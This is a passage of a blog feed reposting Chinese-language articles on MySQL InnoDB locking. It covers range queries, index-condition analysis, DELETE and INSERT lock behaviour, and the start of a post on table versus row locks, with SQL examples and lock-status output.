&lt;p&gt;不过在实际的实现中，MySQL 有一些改进，如果是 RC 隔离级别，在 MySQL Server 过滤条件发现不满足后，会调用 unlock_row 方法，把不满足条件的记录锁释放掉（违背了 2PL 的约束）。这样做可以保证最后只会持有满足条件记录上的锁，但是每条记录的加锁操作还是不能省略的。如果是 RR 隔离级别，一般情况下 MySQL 是不能这样优化的，除非设置了 &lt;code&gt;innodb_locks_unsafe_for_binlog&lt;/code&gt; 参数，这时也会提前释放锁，并且不加 GAP 锁，这就是所谓的 &lt;strong&gt;semi-consistent read&lt;/strong&gt;，关于 semi-consistent read 可以参考 &lt;a href=&#34;http://hedengcheng.com/?p=220&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&#34;2-8-聚簇索引-范围查询&#34;&gt;2.8 聚簇索引，范围查询&lt;/h3&gt;

&lt;p&gt;上面所介绍的各种情况其实都是非常常见的 SQL，它们有一个特点：全部都只有一个 WHERE 条件，并且都是等值查询。那么问题来了，如果不是等值查询而是范围查询，加锁情况会怎么样呢？有人可能会觉得这很简单，根据上面的加锁经验，我们只要给查询范围内的所有记录加上锁即可，如果隔离级别是 RR，所有记录之间再加上间隙锁。事实究竟如何，我们看下面的图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/4271695386.png&#34; alt=&#34;primary-index-range-locks.png&#34; title=&#34;primary-index-range-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;SQL 语句为 &lt;code&gt;UPDATE students SET score = 100 WHERE id &amp;lt;= 20&lt;/code&gt;，按理说我们只需要将 id = 20、18、15 三条记录锁住即可，但是看右边的图，在 RR 隔离级别下，我们还把 id = 30 这条记录以及 (20, 30] 之间的间隙也锁起来了，很显然这是一个 Next-key 锁。如果 WHERE 条件是 id &amp;lt; 20，则会把 id = 20 这条记录锁住。为什么会这样我也不清楚，网上搜了很久，有人说是为了防止幻读，但 id 是唯一主键，(20, 30] 之间是不可能再插入一条 id = 20 的，所以具体的原因还需要再分析下，如果你知道，还请不吝赐教。&lt;/p&gt;

&lt;p&gt;所以对于范围查询，如果 WHERE 条件是 id &amp;lt;= N，那么 N 后一条记录也会被加上 Next-key 锁；如果条件是 id &amp;lt; N，那么 N 这条记录会被加上 Next-key 锁。另外，如果 WHERE 条件是 id &amp;gt;= N，只会给 N 加上记录锁，以及给比 N 大的记录加锁，不会给 N 前一条记录加锁；如果条件是 id &amp;gt; N，也不会锁前一条记录，连 N 这条记录都不会锁。&lt;/p&gt;

&lt;p&gt;====================== 11月26号补充 =========================&lt;/p&gt;

&lt;p&gt;我在做实验的时候发现，在 RR 隔离级别，条件是 id &amp;gt;= 20，有时会对 id &amp;lt; 20 的记录加锁，有时候又不加，感觉找不到任何规律，请以实际情况为准。我对范围查询的加锁原理还不是很明白，后面有时间再仔细研究下，也欢迎有兴趣的同学一起讨论下。&lt;/p&gt;

&lt;p&gt;下面是我做的一个简单的实验，表很简单，只有一列主键 id：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show create table t1;
+-------+--------------------------------------------+
| Table | Create Table                               |
+-------+--------------------------------------------+
| t1    | CREATE TABLE `t1` (                        |
|       |    `id` int(11) NOT NULL AUTO_INCREMENT,   |
|       |    PRIMARY KEY (`id`)                      |
|       | ) ENGINE=InnoDB DEFAULT CHARSET=utf8       |
+-------+--------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;表里一共三条数据：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from t1;
+----+
| id |
+----+
|  2 |
|  4 |
|  6 |
+----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行 &lt;code&gt;delete from t1 where id &amp;gt; 2&lt;/code&gt; 时加锁情况是：(2, 4], (4, 6], (6, +∞)&lt;br /&gt;
执行 &lt;code&gt;select * from t1 where id &amp;gt; 2 for update&lt;/code&gt; 时加锁情况是：(-∞, 2], (2, 4], (4, 6], (6, +∞)&lt;br /&gt;
可见 &lt;strong&gt;select for update&lt;/strong&gt; 和 &lt;strong&gt;delete&lt;/strong&gt; 的加锁还是有所区别的，至于 select for update 为什么加 (-∞, 2] 这个锁，我还是百思不得其解。后来无意中给表 t1 加了一个字段 a int(11) NOT NULL，竟然发现 &lt;code&gt;select * from t1 where id &amp;gt; 2 for update&lt;/code&gt; 就不会给 (-∞, 2] 加锁了，真的非常奇怪。&lt;/p&gt;

&lt;p&gt;====================== 12月3号补充 =========================&lt;/p&gt;

&lt;p&gt;经过几天的搜索，终于找到了一个像样的解释（但不好去证实）：当数据表中数据非常少时，譬如上面那个的例子，select &amp;hellip; [lock in share mode | for update] 语句会走全表扫描，这样表中所有记录都会被锁住，这就是 (-∞, 2] 被锁的原因。而 delete 语句并不会走全表扫描。&lt;/p&gt;

&lt;h3 id=&#34;2-9-二级索引-范围查询&#34;&gt;2.9 二级索引，范围查询&lt;/h3&gt;

&lt;p&gt;然后我们把范围查询应用到二级非唯一索引上来，SQL 语句为：&lt;code&gt;UPDATE students SET score = 100 WHERE age &amp;lt;= 23&lt;/code&gt;，加锁情况如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/4209323709.png&#34; alt=&#34;secondary-index-range-locks.png&#34; title=&#34;secondary-index-range-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看出和聚簇索引的范围查询一样，除了 WHERE 条件范围内的记录加锁之外，后面一条记录也会加上 Next-key 锁，这里有意思的一点是，尽管满足 age = 24 的记录有两条，但只有第一条被加锁，第二条没有加锁，并且第一条和第二条之间也没有加锁。&lt;/p&gt;

&lt;h3 id=&#34;2-10-修改索引值&#34;&gt;2.10 修改索引值&lt;/h3&gt;

&lt;p&gt;这种情况比较容易理解，WHERE 部分的索引加锁原则和上面介绍的一样，多的是 SET 部分的加锁。譬如 &lt;code&gt;UPDATE students SET name = &#39;John&#39; WHERE id = 15&lt;/code&gt; 不仅在 id = 15 记录上加锁之外，还会在 name = &amp;lsquo;Bob&amp;rsquo;（原值）和 name = &amp;lsquo;John&amp;rsquo;（新值） 上加锁。示意图如下（&lt;span style=&#39;color:red;&#39;&gt;此处理解有误，参见下面的评论区&lt;/span&gt;）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/1759431633.png&#34; alt=&#34;update-index-locks.png&#34; title=&#34;update-index-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;RC 和 RR 没有区别。&lt;/p&gt;

&lt;h2 id=&#34;三-复杂条件加锁分析&#34;&gt;三、复杂条件加锁分析&lt;/h2&gt;

&lt;p&gt;前面的例子都是非常简单的 SQL，只包含一个 WHERE 条件，并且是等值查询，当 SQL 语句中包含多个条件时，对索引的分析就相当重要了。因为我们知道行锁最终都是加在索引上的，如果我们连执行 SQL 语句时会使用哪个索引都不知道，又怎么去分析这个 SQL 所加的锁呢？&lt;/p&gt;

&lt;p&gt;MySQL 的索引是一个很复杂的话题，甚至可以写一本书出来了。这里就只是学习一下在对复杂 SQL 加锁分析之前如何先对索引进行分析。譬如下面这样的 SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; DELETE FROM students WHERE name = &#39;Tom&#39; AND age = 22;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中 name 和 age 两个字段都是索引，那么该如何加锁？这其实取决于 MySQL 用哪个索引。可以用 &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/explain-output.html&#34;&gt;EXPLAIN 命令&lt;/a&gt;分析 MySQL 是如何执行这条 SQL 的，通过这个命令可以知道 MySQL 会使用哪些索引以及怎么用索引来执行 SQL 的，只有执行会用到的索引才有可能被加锁，没有使用的索引是不加锁的，这里有&lt;a href=&#34;http://www.cnitblog.com/aliyiyi08/archive/2008/09/09/48878.html&#34;&gt;一篇 EXPLAIN 的博客&lt;/a&gt;可以参考。也可以使用 MySQL 的 &lt;a href=&#34;http://mysqllover.com/?p=708&#34;&gt;optimizer_trace 功能&lt;/a&gt; 来对 SQL 进行分析，它支持将执行的 SQL 的查询计划树记录下来，这个稍微有点难度，有兴趣的同学可以研究下。那么 MySQL 是如何选择合适的索引呢？其实 MySQL 会给每一个索引一个指标，叫做索引的选择性，这个值越高表示使用这个索引能最大程度的过滤更多的记录，关于这个，又是另一个话题了。&lt;/p&gt;

&lt;p&gt;当然，从两个索引中选择一个索引来用，这种情况的加锁分析和我们上一节讨论的情形并没有本质的区别，只需要将那个没有用索引的 WHERE 条件当成普通的过滤条件就好了。这里我们会把用到的索引称为 &lt;strong&gt;Index Key&lt;/strong&gt;，而另一个条件称为 &lt;strong&gt;Table Filter&lt;/strong&gt;。譬如这里如果用到的索引为 age，那么 age 就是 Index Key，而 name = &amp;lsquo;Tom&amp;rsquo; 就是 Table Filter。Index Key 又分为 First Key 和 Last Key，如果 Index Key 是范围查询的话，如下面的例子：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; DELETE FROM students WHERE name = &#39;Tom&#39; AND age &amp;gt; 22 AND age &amp;lt; 25;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中 First Key 为 age &amp;gt; 22，Last Key 为 age &amp;lt; 25。&lt;/p&gt;

&lt;p&gt;所以我们在加锁分析时，只需要确定 Index Key 即可，锁是加在 First Key 和 Last Key 之间的记录上的，如果隔离级别为 RR，同样会有间隙锁。要注意的是，当索引为复合索引时，Index Key 可能会有多个，何登成的这篇博客&lt;a href=&#34;http://hedengcheng.com/?p=577&#34;&gt;《SQL中的where条件，在数据库中提取与应用浅析》&lt;/a&gt; 详细介绍了如何从一个复杂的 WHERE 条件中提取出 Index Key，推荐一读。&lt;a href=&#34;http://www.fordba.com/spend-10-min-to-understand-how-mysql-use-index.html&#34;&gt;这里&lt;/a&gt; 也有一篇博客介绍了 MySQL 是如何利用索引的。&lt;/p&gt;

&lt;p&gt;当索引为复合索引时，不仅可能有多个 &lt;strong&gt;Index Key&lt;/strong&gt;，而且还可能有 &lt;strong&gt;Index Filter&lt;/strong&gt;。所谓 Index Filter，就是复合索引中除 Index Key 之外的其他可用于过滤的条件。如果 MySQL 是 5.6 之前的版本，Index Filter 和 Table Filter 没有区别，统统将 Index First Key 与 Index Last Key 范围内的索引记录，回表读取完整记录，然后返回给 MySQL Server 层进行过滤。而在 MySQL 5.6 之后，Index Filter 与 Table Filter 分离，Index Filter 下降到 InnoDB 的索引层面进行过滤，减少了回表与返回 MySQL Server 层的记录交互开销，提高了SQL的执行效率，这就是传说中的 &lt;a href=&#34;http://&#34;&gt;ICP（Index Condition Pushdown）&lt;/a&gt;，使用 Index Filter 过滤不满足条件的记录，无需加锁。&lt;/p&gt;

&lt;p&gt;这里引用何登成前辈博客中的一个例子（&lt;a href=&#34;http://hedengcheng.com/?p=771&#34;&gt;图片来源&lt;/a&gt;）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/2024580653.png&#34; alt=&#34;complicated-sql-locks.png&#34; title=&#34;complicated-sql-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到 pubtime &amp;gt; 1 and pubtime &amp;lt; 20 为 Index First Key 和 Index Last Key，MySQL 会在这个范围内加上记录锁和间隙锁；userid = &amp;lsquo;hdc&amp;rsquo; 为 Index Filter，这个过滤条件可以在索引层面就可以过滤掉一条记录，因此如果数据库支持 ICP 的话，(4, yyy, 3) 这条记录就不会加锁；comment is not NULL 为 Table Filter，虽然这个条件也可以过滤一条记录，但是它不能在索引层面过滤，而是在根据索引读取了整条记录之后才过滤的，因此加锁并不能省略。&lt;/p&gt;

&lt;h2 id=&#34;四-delete-语句加锁分析&#34;&gt;四、DELETE 语句加锁分析&lt;/h2&gt;

&lt;p&gt;一般来说，DELETE 的加锁和 SELECT FOR UPDATE 或 UPDATE 并没有太大的差异，DELETE 语句一样会有下面这些情况：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;聚簇索引，查询命中：DELETE FROM students WHERE id = 15;&lt;/li&gt;
&lt;li&gt;聚簇索引，查询未命中：DELETE FROM students WHERE id = 16;&lt;/li&gt;
&lt;li&gt;二级唯一索引，查询命中：DELETE FROM students WHERE no = &amp;lsquo;S0003&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级唯一索引，查询未命中：DELETE FROM students WHERE no = &amp;lsquo;S0008&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级非唯一索引，查询命中：DELETE FROM students WHERE name = &amp;lsquo;Tom&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级非唯一索引，查询未命中：DELETE FROM students WHERE name = &amp;lsquo;John&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;无索引：DELETE FROM students WHERE score = 22;&lt;/li&gt;
&lt;li&gt;聚簇索引，范围查询：DELETE FROM students WHERE id &amp;lt;= 20;&lt;/li&gt;
&lt;li&gt;二级索引，范围查询：DELETE FROM students WHERE age &amp;lt;= 23;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对这些情况的加锁分析和上文一致，这里不再赘述。&lt;/p&gt;

&lt;p&gt;那么 DELETE 语句和 UPDATE 语句的加锁到底会有什么不同呢？我们知道，在 MySQL 数据库中，执行 DELETE 语句其实并没有直接删除记录，而是在记录上打上一个删除标记，然后通过后台的一个叫做 purge 的线程来清理。从这一点来看，DELETE 和 UPDATE 确实是非常相像。事实上，DELETE 和 UPDATE 的加锁也几乎是一样的，这里要单独加一节来说明 DELETE 语句的加锁分析，其实并不是因为 DELETE 语句的加锁和其他语句有所不同，而是因为 DELETE 语句导致多了一种特殊类型的记录：标记为删除的记录，对于这种类型记录，它的加锁和其他记录的加锁机制不一样。所以这一节的标题叫做 &lt;strong&gt;标记为删除的记录的加锁分析&lt;/strong&gt; 可能更合适。&lt;/p&gt;

&lt;p&gt;那么问题又来了：什么情况下会对已标记为删除的记录加锁呢？我总结下来会有两种情况：&lt;strong&gt;阻塞后加锁&lt;/strong&gt; 和 &lt;strong&gt;快照读后加锁&lt;/strong&gt;（自己取得名字），下面分别介绍。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;阻塞后加锁&lt;/strong&gt; 如下图所示，事务 A 删除 id = 18 这条记录，同时事务 B 也删除 id = 18 这条记录，很显然，id 为主键，DELETE 语句需要获取 X 记录锁，事务 B 阻塞。事务 A 提交之后，id = 18 这条记录被标记为删除，此时事务 B 就需要对已删除记录进行加锁。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/1072438476.png&#34; alt=&#34;delete-locks-after-block.png&#34; title=&#34;delete-locks-after-block.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;快照读后加锁&lt;/strong&gt; 如下图所示，事务 A 删除 id = 18 这条记录，并提交。事务 B 在事务 A 提交之前有一次 id = 18 的快照读，所以在后面删除 id = 18 这条记录的时候就需要对已删除记录加锁了。如果没有事务开头的这个快照读，DELETE 语句就只是简单的删除一条不存在的记录。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/12/1473185167.png&#34; alt=&#34;delete-locks-after-snapshot-read.png&#34; title=&#34;delete-locks-after-snapshot-read.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;注意，上面的事务 B 不限于 DELETE 语句，换成 UPDATE 或 SELECT FOR UPDATE 同样适用。网上对这种删除记录的加锁分析并不多，我通过自己做的实验，得到了下面这些结论，如有不正确的地方，欢迎斧正。（实验环境，MySQL 版本：5.7，隔离级别：RR）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;删除记录为聚簇索引&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;阻塞后加锁：在删除记录上加 X 记录锁（rec but not gap），并在删除的后一条记录上加间隙锁（gap before rec）&lt;/li&gt;
&lt;li&gt;快照读后加锁：在删除记录上加 X 记录锁（rec but not gap）&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;删除记录为二级索引（唯一索引和非唯一索引都适用）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;阻塞后加锁：在删除记录上加 Next-key 锁，并在删除的后一条记录上加间隙锁&lt;/li&gt;
&lt;li&gt;快照读后加锁：在删除记录上加 Next-key 锁，并在删除的后一条记录上加间隙锁&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;要注意的是，这里的隔离级别为 RR，如果在 RC 隔离级别下，加锁过程应该会不一样，感兴趣的同学可以自行实验。关于 DELETE 语句的加锁，何登成前辈在他的博客：&lt;a href=&#34;http://hedengcheng.com/?p=844&#34;&gt;一个最不可思议的MySQL死锁分析&lt;/a&gt; 里面有详细的分析，并介绍了页面锁的相关概念，还原了仅仅只有一条 DELETE 语句也会造成死锁的整个过程，讲的很精彩。&lt;/p&gt;

&lt;h2 id=&#34;五-insert-语句加锁分析&#34;&gt;五、INSERT 语句加锁分析&lt;/h2&gt;

&lt;p&gt;上面所提到的加锁分析，都是针对 SELECT FOR UPDATE、UPDATE、DELETE 等进行的，那么针对 INSERT 加锁过程又是怎样的呢？我们下面继续探索。&lt;/p&gt;

&lt;p&gt;还是用 students 表来实验，譬如我们执行下面的 SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; insert into students(no, name, age, score) value(&#39;S0008&#39;, &#39;John&#39;, 26, 87);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后我们用 &lt;code&gt;show engine innodb status\G&lt;/code&gt; 查询事务的锁情况：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;---TRANSACTION 3774, ACTIVE 2 sec
1 lock struct(s), heap size 1136, 0 row lock(s), undo log entries 1
MySQL thread id 150, OS thread handle 10420, query id 3125 localhost ::1 root
TABLE LOCK table `sys`.`t3` trx id 3774 lock mode IX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们发现除了一个 IX 的 TABLE LOCK 之外，就没有其他的锁了，难道 INSERT 不加锁？一般来说，加锁都是对表中已有的记录进行加锁，而 INSERT 语句是插入一条新的纪录，这条记录表中本来就没有，那是不是就不需要加锁了？显然不是，至少有两个原因可以说明 INSERT 加了锁：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;为了防止幻读，如果记录之间加有 GAP 锁，此时不能 INSERT；&lt;/li&gt;
&lt;li&gt;如果 INSERT 的记录和已有记录造成唯一键冲突，此时不能 INSERT；&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;要解决这两个问题，都是靠锁来解决的（第一个加插入意向锁，第二个加 S 锁进行当前读），只是在 INSERT 的时候如果没有出现这两种情况，那么锁就是隐式的，只是我们看不到而已。这里我们不得不提一个概念叫 &lt;strong&gt;隐式锁（Implicit Lock）&lt;/strong&gt;，它对我们分析 INSERT 语句的加锁过程至关重要。&lt;/p&gt;

&lt;p&gt;关于隐式锁，这篇文章&lt;a href=&#34;http://www.uml.org.cn/sjjm/201205302.asp&#34;&gt;《MySQL数据库InnoDB存储引擎中的锁机制》&lt;/a&gt;对其做了详细的说明，讲的非常清楚，推荐一读。可以参考上一篇介绍的悲观锁和乐观锁。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;锁是一种悲观的顺序化机制，它假设很可能发生冲突，因此在操作数据时，就加锁，如果冲突的可能性很小，多数的锁都是不必要的。Innodb 实现了一个延迟加锁的机制来减少加锁的数量，这被称为隐式锁。&lt;/p&gt;

&lt;p&gt;隐式锁中有个重要的元素：事务ID（trx_id）。隐式锁的逻辑过程如下：&lt;/p&gt;

&lt;p&gt;A. InnoDB 的每条记录中都有一个隐含的 trx_id 字段，这个字段存在于簇索引的 B+Tree 中;&lt;br /&gt;
B. 在操作一条记录前，首先根据记录中的 trx_id 检查该事务是否是活动的事务（未提交或回滚），如果是活动的事务，首先将隐式锁转换为显式锁（就是为该事务添加一个锁）；&lt;br /&gt;
C. 检查是否有锁冲突，如果有冲突，创建锁，并设置为 waiting 状态；如果没有冲突不加锁，跳到 E；&lt;br /&gt;
D. 等待加锁成功，被唤醒，或者超时；&lt;br /&gt;
E. 写数据，并将自己的 trx_id 写入 trx_id 字段。&lt;/p&gt;

&lt;p&gt;隐式锁的特点是只有在可能发生冲突时才加锁，减少了锁的数量。另外，隐式锁是针对被修改的 B+Tree 记录，因此都是 Record 类型的锁，不可能是 Gap 或 Next-Key 类型。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;INSERT 操作只加隐式锁，不需要显示加锁；&lt;/li&gt;
&lt;li&gt;UPDATE、DELETE 在查询时，直接对查询用的 Index 和主键使用显示锁，其他索引上使用隐式锁。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;理论上说，可以对主键使用隐式锁的。提前使用显示锁应该是为了减少死锁的可能性。INSERT，UPDATE，DELETE 对 B+Tree 们的操作都是从主键的 B+Tree 开始，因此对主键加锁可以有效的阻止死锁。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;INSERT 加锁流程如下（&lt;a href=&#34;http://keithlan.github.io/2017/06/21/innodb_locks_algorithms/&#34;&gt;参考&lt;/a&gt;）：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先对插入的间隙加插入意向锁（Insert Intension Locks）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;如果该间隙已被加上了 GAP 锁或 Next-Key 锁，则加锁失败进入等待；&lt;/li&gt;
&lt;li&gt;如果没有，则加锁成功，表示可以插入；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;然后判断插入记录是否有唯一键，如果有，则进行唯一性约束检查&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;如果不存在相同键值，则完成插入&lt;/li&gt;

&lt;li&gt;&lt;p&gt;如果存在相同键值，则判断该键值是否加锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;如果没有锁， 判断该记录是否被标记为删除&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;如果标记为删除，说明事务已经提交，还没来得及 purge，这时加 S 锁等待；&lt;/li&gt;
&lt;li&gt;如果没有标记删除，则报 1062 duplicate key 错误；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;如果有锁，说明该记录正在处理（新增、删除或更新），且事务还未提交，加 S 锁等待；&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;插入记录并对记录加 X 记录锁；&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里的表述其实并不准确，有兴趣的同学可以去阅读 InnoDb 的源码分析 INSERT 语句具体的加锁过程，我在 &lt;a href=&#34;http://www.aneasystone.com/archives/2018/06/insert-locks-via-mysql-source-code.html&#34;&gt;《读 MySQL 源码再看 INSERT 加锁流程》&lt;/a&gt; 这篇博客中有详细的介绍。&lt;/p&gt;

&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;http://hedengcheng.com/?p=771&#34;&gt;何登成的技术博客 - MySQL 加锁处理分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hedengcheng.com/?p=220&#34;&gt;何登成的技术博客 - MySQL+InnoDB semi-consitent read原理及实现分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hedengcheng.com/?p=577&#34;&gt;何登成的技术博客 - SQL中的where条件，在数据库中提取与应用浅析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hedengcheng.com/?p=844&#34;&gt;何登成的技术博客 - 一个最不可思议的MySQL死锁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fanyilun.me/2017/04/20/MySQL%E5%8A%A0%E9%94%81%E5%88%86%E6%9E%90/&#34;&gt;Yilun Fan&amp;rsquo;s Blog - MySQL加锁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fordba.com/spend-10-min-to-understand-how-mysql-use-index.html&#34;&gt;10分钟让你明白MySQL是如何利用索引的&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fordba.com/locks-set-by-different-sql-statements-in-innodb.html&#34;&gt;MySQL innodb中各种SQL语句加锁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.cnblogs.com/yelbosh/p/5813865.html&#34;&gt;MySQL的并发控制与加锁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://novoland.github.io/%E6%95%B0%E6%8D%AE%E5%BA%93/2015/08/17/InnoDB%20%E9%94%81.html&#34;&gt;克鲁斯卡尔的博客 - InnoDB 锁&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.uml.org.cn/sjjm/201205302.asp&#34;&gt;MySQL数据库InnoDB存储引擎中的锁机制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fordba.com/lock-analyse-of-delete.html&#34;&gt;MySQL DELETE 删除语句加锁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://keithlan.github.io/2017/06/21/innodb_locks_algorithms/&#34;&gt;MySQL锁系列（七）之 锁算法详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://mysqllover.com/?p=708&#34;&gt;初识5.6的optimizer trace&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://mysqllover.com/?p=431&#34;&gt;MySQL学习Innodb锁系统(4) Insert/Delete锁处理及死锁示例分析&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;转载自：&lt;a href=&#34;https://www.aneasystone.com/archives/2017/12/solving-dead-locks-three.html&#34;&gt;aneasystone&amp;rsquo;s blog&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>死锁 - 了解常见的锁类型</title>
      <link>https://wangzitao6.github.io/2018-07-28-%E4%BA%86%E8%A7%A3%E5%B8%B8%E8%A7%81%E7%9A%84%E9%94%81%E7%B1%BB%E5%9E%8B</link>
      <pubDate>Sat, 28 Jul 2018 10:20:22 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-07-28-%E4%BA%86%E8%A7%A3%E5%B8%B8%E8%A7%81%E7%9A%84%E9%94%81%E7%B1%BB%E5%9E%8B</guid>
      <description>

&lt;h2 id=&#34;表锁-vs-行锁&#34;&gt;表锁 vs. 行锁&lt;/h2&gt;

&lt;p&gt;在 MySQL 中锁的种类有很多，但是最基本的还是表锁和行锁：表锁指的是对一整张表加锁，一般是 DDL 处理时使用，也可以自己在 SQL 中指定；而行锁指的是锁定某一行数据或某几行，或行和行之间的间隙。行锁的加锁方法比较复杂，但是由于只锁住有限的数据，对于其它数据不加限制，所以并发能力强，通常都是用行锁来处理并发事务。表锁由 MySQL 服务器实现，行锁由存储引擎实现，常见的就是 InnoDb，所以通常我们在讨论行锁时，隐含的一层意义就是数据库的存储引擎为 InnoDb ，而 MyISAM 存储引擎只能使用表锁。&lt;/p&gt;

&lt;h3 id=&#34;表锁&#34;&gt;表锁&lt;/h3&gt;

&lt;p&gt;表锁由 MySQL 服务器实现，所以无论你的存储引擎是什么，都可以使用。一般在执行 DDL 语句时，譬如 &lt;strong&gt;ALTER TABLE&lt;/strong&gt; 就会对整个表进行加锁。在执行 SQL 语句时，也可以明确对某个表加锁，譬如下面的例子：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; lock table products read;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select * from products where id = 100;

mysql&amp;gt; unlock tables;
Query OK, 0 rows affected (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的 SQL 首先对 products 表加一个表锁，然后执行查询语句，最后释放表锁。表锁可以细分成两种：读锁和写锁，如果是加写锁，则是 &lt;code&gt;lock table products write&lt;/code&gt; 。详细的语法可以参考 &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/lock-tables.html&#34;&gt;MySQL 的官网文档&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;关于表锁，我们要了解它的加锁和解锁原则，要注意的是它使用的是 &lt;strong&gt;一次封锁&lt;/strong&gt; 技术，也就是说，我们会在会话开始的地方使用 lock 命令将后面所有要用到的表加上锁，在锁释放之前，我们只能访问这些加锁的表，不能访问其他的表，最后通过 unlock tables 释放所有表锁。这样的好处是，不会发生死锁！所以我们在 MyISAM 存储引擎中，是不可能看到死锁场景的。对多个表加锁的例子如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  mysql&amp;gt; lock table products read, orders read;
  Query OK, 0 rows affected (0.00 sec)

  mysql&amp;gt; select * from products where id = 100;

  mysql&amp;gt; select * from orders where id = 200;

  mysql&amp;gt; select * from users where id = 300;
  ERROR 1100 (HY000): Table &#39;users&#39; was not locked with LOCK TABLES

  mysql&amp;gt; update orders set price = 5000 where id = 200;
  ERROR 1099 (HY000): Table &#39;orders&#39; was locked with a READ lock and can not be updated

  mysql&amp;gt; unlock tables;
  Query OK, 0 rows affected (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

